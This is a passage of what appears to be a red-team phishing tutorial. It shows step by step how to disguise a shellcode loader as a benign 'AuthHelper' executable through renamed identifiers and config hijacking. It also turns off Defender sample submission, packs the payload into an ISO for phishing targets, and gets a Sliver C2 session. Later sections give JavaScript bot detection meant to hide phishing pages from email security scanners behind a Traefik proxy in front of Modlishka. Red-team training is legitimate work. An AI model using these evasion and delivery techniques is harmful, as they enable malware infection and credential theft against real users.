</span></span></code></pre></div><p>Pay attention to the output. I had to make note of the padding value and add it to two lines in the <code>.cs</code> file</p><h3 id=update-distauthhelperexeconfig>Update <code>dist\AuthHelper.exe.config</code><a class=td-heading-self-link href=#update-distauthhelperexeconfig aria-label="Heading self-link"></a></h3><ul><li>We need to replace <code>test</code> with our executable name our executable name without the extension (<code>AuthHelper</code>).</li><li>Next we need to update the value of <code>appDomainManagerType</code> to be something else <code>NewAuthHelper</code>.</li><li>Finally lets make <code>privatePath</code> a relative path <code>.</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;configuration&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;runtime&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;assemblyBinding</span> <span class=na>xmlns=</span><span class=s>&#34;urn:schemas-microsoft-com:asm.v1&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>         <span class=nt>&lt;probing</span> <span class=na>privatePath=</span><span class=s>&#34;.&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/assemblyBinding&gt;</span> 
</span></span><span class=line><span class=cl>	  <span class=nt>&lt;appDomainManagerAssembly</span> <span class=na>value=</span><span class=s>&#34;AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl>	  <span class=nt>&lt;appDomainManagerType</span> <span class=na>value=</span><span class=s>&#34;NewAuthHelper&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/runtime&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/configuration&gt;</span>
</span></span></code></pre></div><h3 id=update-authhelperauthhelpercs>Update AuthHelper\AuthHelper.cs<a class=td-heading-self-link href=#update-authhelperauthhelpercs aria-label="Heading self-link"></a></h3><p>Now we need to update the <code>AuthHelper.cs</code> file.</p><ul><li>remove top three lines prepended with <code>#</code></li><li>replace <code>Z45UDG</code> with <code>NewAuthHelper</code></li><li>comment out logging on lines <code>154</code> and <code>161</code></li><li>replace <code>S3cretK3y</code> with <code>PYLD4ME</code></li><li>change <code>Z:\\zloader\\update.exe</code> to <code>AuthHelper.exe</code></li><li>replace all instances of <code>shellcode</code> with <code>certData</code></li><li>replace all instances of <code>ClassExample</code> with <code>AuthHelper</code></li><li>replace all instances of <code>Executing Beacon!</code> with <code>Begin Execution!</code></li><li>replace all instances of <code>Decrypt</code> with <code>CheckAuth</code></li><li>replace all instances of <code>ExecShellcode</code> with <code>Authorize</code></li><li>Update <code>_peBlob.Length+2</code> to be <code>_peBlob.Length+10</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:dist\AuthHelper.dll AuthHelper.cs
</span></span></code></pre></div><h3 id=prepare-for-testing>Prepare for Testing<a class=td-heading-self-link href=#prepare-for-testing aria-label="Heading self-link"></a></h3><p>We need to modify <code>C:\Windows\System32\drivers\etc\hosts</code> and add an entry for <code>test.example</code>.</p><ul><li><p>Run notepad as administrator
<img src=/static/how-to-phishing/notepad-runas.png alt="Run Notepad as Administrator"></p></li><li><p>Ensure you have <code>All Files</code> selected
<img src=/static/how-to-phishing/notepad-open-allfiles.png alt="Notepad Show All Files"></p></li><li><p>Browse to <code>C:\Windows\System32\drivers\etc\</code></p></li><li><p>Add en entry for <code>test.example</code> to go to your Linux box running <code>sliver</code>.
<img src=/static/how-to-phishing/windows-hosts-entry.png alt="Windows Hosts File Entry"></p></li></ul><p>We should also set defender to not send off samples.</p><ul><li><p>Open Windows Defender
<img src=/static/how-to-phishing/defender-tray.png alt="Defender Tray Entry"></p></li><li><p>Select <strong>Virus & threat protection</strong> from the left side navigation.</p></li><li><p>Click <strong>Manage settings</strong>
<img src=/static/how-to-phishing/defender-settings.png alt="Defender Settings"></p></li><li><p>Turn off sample submission
<img src=/static/how-to-phishing/defender-sample-submission.png alt="Defender Sample Submission"></p></li></ul><h3 id=testing>Testing<a class=td-heading-self-link href=#testing aria-label="Heading self-link"></a></h3><p>Now we should be able to open out <code>dist</code> folder and run the <code>AuthHelper.exe</code>.
<img src=/static/how-to-phishing/better-payload-testing.png alt="Better Payload Testing"></p><p>We should see a new session popup in Sliver
<img src=/static/how-to-phishing/better-payload-testing-sliver.png alt="Better Payload Testing Sliver"></p><p>Now would be a good time to fine tune our code, remove debugging messages, or add a nice special message that says &ldquo;Good job! Now your more secure!!&rdquo;.</p><h3 id=packmypayload>PackMyPayload<a class=td-heading-self-link href=#packmypayload aria-label="Heading self-link"></a></h3><p>Now that we have a nice payload, lets pack it up so we can send it to our phishing targets. We&rsquo;ll use <a href=https://github.com/mgeeky/PackMyPayload>https://github.com/mgeeky/PackMyPayload</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install python3-pip
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/opt
</span></span><span class=line><span class=cl>git clone https://github.com/mgeeky/PackMyPayload.git
</span></span><span class=line><span class=cl><span class=nb>cd</span> PackMyPayload
</span></span><span class=line><span class=cl>python3 -m pip install -r requirements.txt
</span></span></code></pre></div><p>Copy dist folder to your linux VM. I put it in <code>~/Desktop/op/payloads/AuthHelper/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> ~/Desktop/op/payloads/AuthHelper
</span></span><span class=line><span class=cl>python3 ~/opt/PackMyPayload/PackMyPayload.py --hide AuthHelper.dll,AuthHelper.exe.config dist AuthHelper.iso -v
</span></span></code></pre></div><p>Now we should have a nice <code>.iso</code> file we can send users.
<img src=/static/how-to-phishing/packmypayload.png alt=PackMyPayload></p><h3 id=testing-again>Testing&mldr; Again<a class=td-heading-self-link href=#testing-again aria-label="Heading self-link"></a></h3><p>Now we need to test again to make sure everything is working as designed. Copy the <code>AuthHelper.iso</code> to the Windows machine. We&rsquo;d hate for users to receive this message instead of us getting a new session:</p><p><img src=/static/how-to-phishing/iso-mount-error.png alt=Error></p></div><div class=td-content style=page-break-before:always><h1 id=pg-80ae82d275d31c0359bf4111e10f40fe>27 - Bot Detection</h1><h3 id=what-are-bots>What are bots?<a class=td-heading-self-link href=#what-are-bots aria-label="Heading self-link"></a></h3><p>Bots are usually headless browsers that visit links in email and analyze them for threats. This includes looking for
logins, especially popular ones that are not on the correct domain. We need a reliable way to determine if a request is
coming from a real user or a bot.</p><h3 id=how-can-we-detect-bots>How can we detect bots?<a class=td-heading-self-link href=#how-can-we-detect-bots aria-label="Heading self-link"></a></h3><p>To do this we can use javascript to inspect the browser that is visiting our page. There are a number of decent articles
out there on how to do this. We&rsquo;ll use hat minimum to detect <a href=https://urlscan.io>urlscan.io</a>.</p><p>Example test script for enumerating bots. We are using <a href=https://urlscan.io>urlscan.io</a> to screenshot it and read the
output. However, if we were testing email bots, we&rsquo;d probably want to send this information to a server so we could
analyze it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>botCheck</span><span class=p>(</span><span class=nx>isBotFn</span><span class=p>,</span> <span class=nx>isNotBotFn</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>dumbtimeoutRan</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>dumbtimeoutRan</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>1500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>defaultTimeout</span> <span class=o>=</span> <span class=mi>1200</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>startTime</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>execTime</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>timeoutDiff</span> <span class=o>=</span> <span class=nx>execTime</span> <span class=o>-</span> <span class=nx>startTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Check notifications
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>navigator</span><span class=p>.</span><span class=nx>permissions</span><span class=p>.</span><span class=nx>query</span><span class=p>({</span><span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;notifications&#39;</span><span class=p>}).</span><span class=nx>then</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>permissionStatus</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>notificationsDisabled</span><span class=o>:</span> <span class=nx>Notification</span><span class=p>.</span><span class=nx>permission</span> <span class=o>===</span> <span class=s1>&#39;denied&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>permissionStatus</span><span class=p>.</span><span class=nx>state</span> <span class=o>===</span> <span class=s1>&#39;prompt&#39;</span> <span class=o>&amp;&amp;</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>headlessUA</span><span class=o>:</span> <span class=sr>/HeadlessChrome/</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>userAgent</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                    <span class=nx>timeoutDiff</span><span class=o>:</span> <span class=nx>timeoutDiff</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>defaultTimeout</span><span class=o>:</span> <span class=nx>defaultTimeout</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>dumbtimeoutRan</span><span class=o>:</span> <span class=nx>dumbtimeoutRan</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>evalString</span><span class=o>:</span> <span class=nb>eval</span><span class=p>.</span><span class=nx>toString</span><span class=p>().</span><span class=nx>length</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>screenOffset</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screenX</span> <span class=o>+</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screenY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowwidth</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>width</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowheight</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>height</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowavailWidth</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>availWidth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowavailHeight</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>availHeight</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowavailTop</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>availTop</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowavailLeft</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>availLeft</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowcolorDepth</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>colorDepth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>windowpixelDepth</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screen</span><span class=p>.</span><span class=nx>pixelDepth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>userAgent</span><span class=o>:</span> <span class=nb>window</span><span class=p>.</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>userAgent</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>data</span><span class=p>).</span><span class=nx>replaceAll</span><span class=p>(</span><span class=s1>&#39;,&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;,&lt;br&gt;&#34;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=nx>defaultTimeout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>botCheck</span><span class=p>(</span><span class=nx>handleBot</span><span class=p>,</span> <span class=nx>handleNotBot</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><img src=/static/how-to-phishing/urlscan-screenshot.png alt="URLScan.io Screenshot"></p><p>We&rsquo;ve collected some decent metrics from the URL scan headless browser. We can see that the screen offset it 0. This
means that the browser is in the top left corner of the desktop. We&rsquo;ll use that as our simple check for now. However,
many mobile browsers will report the same thing, so this isn&rsquo;t a catch-all solution. We&rsquo;d need to spend some time
capturing metrics from different bots and real browsers to come up with a decent bot detector.</p><p>Now we&rsquo;ll simplify our Javascript to just what we need.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>botCheck</span><span class=p>(</span><span class=nx>isBotFn</span><span class=p>,</span> <span class=nx>isNotBotFn</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>isBot</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screenX</span> <span class=o>+</span> <span class=nb>window</span><span class=p>.</span><span class=nx>screenY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>isBot</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>isBotFn</span><span class=p>.</span><span class=nx>call</span><span class=p>(</span><span class=nb>window</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>isNotBotFn</span><span class=p>.</span><span class=nx>call</span><span class=p>(</span><span class=nb>window</span><span class=p>,</span> <span class=nx>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>handleBot</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// only bots should execute this
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;hi bot!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>handleNotBot</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Non-bots should execute this. 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;Hello Human!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>botCheck</span><span class=p>(</span><span class=nx>handleBot</span><span class=p>,</span> <span class=nx>handleNotBot</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div></div><div class=td-content style=page-break-before:always><h1 id=pg-0d9397d022264ae475b2c56564615238>28 - Traefik Reverse Proxy</h1><h3 id=traefik-reverse-proxy>Traefik Reverse Proxy<a class=td-heading-self-link href=#traefik-reverse-proxy aria-label="Heading self-link"></a></h3><p>Now that we have a reliable way to detect bots, we need to be able to make that determination before showing the phishing page. Then we can show bots simple non-malicious content and users will get our phishing pages. We can do this using traefik to route requests based on cookies. We can put traefik in front of Modlishka and force all request to go through a simple bot check before loading our phishing site.</p><p>We&rsquo;ll start by adding a new Traefik container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml></code></pre></div><p>Then we&rsquo;ll add a new NGINX container to serve our bot detection landing page.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml></code></pre></div><p>Now we can create our bot detection landing page</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash></code></pre></div><p>paste the content:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html></code></pre></div><p>Add some additional configuration to the modlishka container so Traefik can act as a proxy for it.</p><p>Now we can test it out.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo docker compose up
</span></span></code></pre></div><p>Now we can use our new traefik URL as our Gophish URL in a phishing campaign.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-c795a7577570ff8c56566c9f51f92318>29 - Wrap up</h1><blockquote><p>THIS IS A ROUGH OUTLINE OF WHAT NEEDS TO BE FINISHED</p></blockquote><h3 id=what-needs-to-change-for-live-assessments>What needs to change for live assessments<a class=td-heading-self-link href=#what-needs-to-change-for-live-assessments aria-label="Heading self-link"></a></h3><p>Now we have a decent understanding of our current capabilities. How can we successfully execute this for reals?</p><p>We need the following:</p><ul><li>A domain to send emails from.</li><li>A domain to host malicious content. Could be the same, but it&rsquo;s nice have them separate in case one is burned.</li><li>TLS Certs.</li><li>A target and their permission.</li></ul><h3 id=domains>Domains<a class=td-heading-self-link href=#domains aria-label="Heading self-link"></a></h3><p>We like to use Amazon&rsquo;s Route53 for a number of reasons:</p><ul><li>It is pretty simple to acquire domains.</li><li>Supports automation via APIs.</li><li>Tooling support.</li></ul><h3 id=gophish-sending-emails-frd>Gophish: Sending Emails FRD<a class=td-heading-self-link href=#gophish-sending-emails-frd aria-label="Heading self-link"></a></h3><p>Now we want to send real emails. We have quite a few options to do this. Our typical workflow is to use Amazon SES, but there are other options. Any service that supports SMTP should work.</p><ul><li>SES</li><li>Gmail</li><li>Shared hosting (godaddy)</li><li>Manually setting up postfix</li></ul><p>It should be as simple as the MailHog setup, but using the required credentials&mldr;</p><hr><h3 id=traefik-tls>Traefik TLS<a class=td-heading-self-link href=#traefik-tls aria-label="Heading self-link"></a></h3><p>Traefik can generate all the certs you need, it just needs an API key to manage DNS records on your domains.</p><hr><h3 id=where-to-from-here>Where to from here?<a class=td-heading-self-link href=#where-to-from-here aria-label="Heading self-link"></a></h3><ul><li>Automate VM Build.</li><li>Automate infrastructure deployment.</li></ul></div></main></div></div><footer class="td-footer row d-print-none"><div class=container-fluid><div class="row mx-md-2"><div class="td-footer__left col-6 col-sm-4 order-sm-1"><ul class=td-footer__links-list><li class=td-footer__links-item data-bs-toggle=tooltip title="Bugcrwod Profile" aria-label="Bugcrwod Profile"><a target=_blank rel=noopener href=https://bugcrowd.com/defektive aria-label="Bugcrwod Profile"><i class="fa fa-bug"></i></a></li><li class=td-footer__links-item data-bs-toggle=tooltip title=LinkedIn aria-label=LinkedIn><a target=_blank rel=noopener href=https://www.linkedin.com/in/dfktv/ aria-label=LinkedIn><i class="fab fa-linkedin"></i></a></li></ul></div><div class="td-footer__right col-6 col-sm-4 order-sm-3"><ul class=td-footer__links-list><li class=td-footer__links-item data-bs-toggle=tooltip title=GitHub aria-label=GitHub><a target=_blank rel=noopener href=https://github.com/defektive aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="td-footer__center col-12 col-sm-4 py-2 order-sm-2"><span class=td-footer__copyright>&copy;
2018&ndash;2025
<span class=td-footer__authors>Brad Horrocks | <a href=https://creativecommons.org/licenses/by/4.0>CC BY 4.0</a> |</span></span><span class=td-footer__all_rights_reserved>All Rights Reserved</span></div></div></div></footer></div><script src=/js/main.min.5263105cb625a59e8561232bde7f852ec9b9262cd64e6b9283f0f2e4c1008321.js integrity="sha256-UmMQXLYlpZ6FYSMr3n+FLsm5JizWTmuSg/Dy5MEAgyE=" crossorigin=anonymous></script>
<script defer src=/js/click-to-copy.min.73478a7d4807698aed7e355eb23f9890ca18fea3158604c8471746d046702bad.js integrity="sha256-c0eKfUgHaYrtfjVesj+YkMoY/qMVhgTIRxdG0EZwK60=" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script></body></html>